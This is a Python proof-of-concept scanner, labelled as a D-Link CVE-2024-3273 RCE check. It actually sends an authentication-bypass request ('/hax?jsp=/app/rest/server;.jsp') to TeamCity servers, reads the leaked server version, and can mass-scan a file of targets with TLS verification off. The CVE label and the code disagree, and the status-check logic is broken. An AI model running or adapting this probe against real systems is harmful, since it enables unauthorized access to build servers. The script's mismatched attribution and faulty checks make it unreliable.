import argparse
import sys
import requests
from urllib.parse import urlparse
import lxml.etree as et
import urllib3
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

print('----------------------------------------')
print('                                        ')
print('           CVE-2024-3273                ')
print('              by chunsheng-F0re4t       ')
print('----------------------------------------')

def poc(target):
    if not urlparse(target).scheme:
        target = "http://" + target
    url = target + "/hax?jsp=/app/rest/server;.jsp"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate"
    }
    # Add any necessary cookies or authentication headers

    try:
        r = requests.get(url, headers=headers, verify=False)  # Set verify to True if using SSL/TLS
        tree = et.fromstring(r.content)
        teamcity_version = tree.xpath('//server/@version')[0]
        if r.status_code != 200:
            return ""
        if r.status_code == 200:
            if "version" in r.text:
                print(f"{target} [+] 存在漏洞!  版本为：{teamcity_version}")
            else:
                print("[-] Vulnerability not found.")
        else:
            print("[-] Request failed with status code:", r.status_code)

            
    
    except Exception as e: 
        print("Parse error:", e)
        return ""

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="D-link-rce POC")
    parser.add_argument("-u", "--url", dest="target_url", help="Target URL")
    parser.add_argument("-f", "--file", dest="file_path", help="File containing target URLs")

    args = parser.parse_args()

    if not args.target_url and not args.file_path:
        parser.print_help()
        sys.exit(1)

    if args.target_url:
        poc(args.target_url)
    
    if args.file_path:
        with open(args.file_path, "r") as file:
            for line in file:
                target_url = line.strip()
                poc(target_url)


                